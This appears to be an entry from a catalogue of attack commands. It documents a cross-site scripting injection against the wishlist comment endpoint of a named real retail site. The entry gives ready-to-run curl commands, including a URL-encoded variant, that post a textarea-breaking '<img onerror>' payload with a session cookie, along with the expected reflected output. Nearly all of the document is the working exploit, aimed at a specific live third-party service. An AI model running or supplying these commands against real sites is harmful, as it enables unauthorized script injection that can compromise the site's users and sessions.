---
id: cmd-uuid-002
data: >-
  curl -X POST
  'https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/[ID]'
  -d 'wishlistComment=</textarea><img src=x onerror=alert(1)>' -H 'Cookie:
  [AUTH_COOKIE]'
tags:
  - xss
  - http-post
type: command
output: 'Reflected unsanitized payload in textarea, triggering JS on load'
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:43.151Z'
verified: false
validated: true
submitted: true
---
# Inject XSS Comment

## Command

```bash
curl -X POST 'https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/[ID]' -d 'wishlistComment=</textarea><img src=x onerror=alert(1)>' -H 'Cookie: [AUTH_COOKIE]'
```

## Description

Injects an XSS payload into the wishlist comment, breaking out of the textarea to execute JavaScript via onerror.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `[ID]` | Wishlist ID | Yes |
| `wishlistComment=...` | Payload string | Yes |
| `-H 'Cookie: [AUTH_COOKIE]'` | Session cookie | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/12345' -d 'wishlistComment=</textarea><img src=x onerror=alert(1)>' -H 'Cookie: sid=abc123'
```

### Advanced Usage

```bash
curl -X POST 'https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/12345' -d 'wishlistComment=%3C%2Ftextarea%3E%3Cimg%20src=x%20onerror=alert(1)%3E' -H 'Cookie: sid=abc123' -v
```

## Expected Output

<textarea...></textarea><img src=x onerror=alert(1)></textarea> in response; alert on reflection.

## Related

- [[commands/submit-wishlist-comment]]
- [[procedures/Inject-XSS-Payload-in-Wishlist-Comment]]
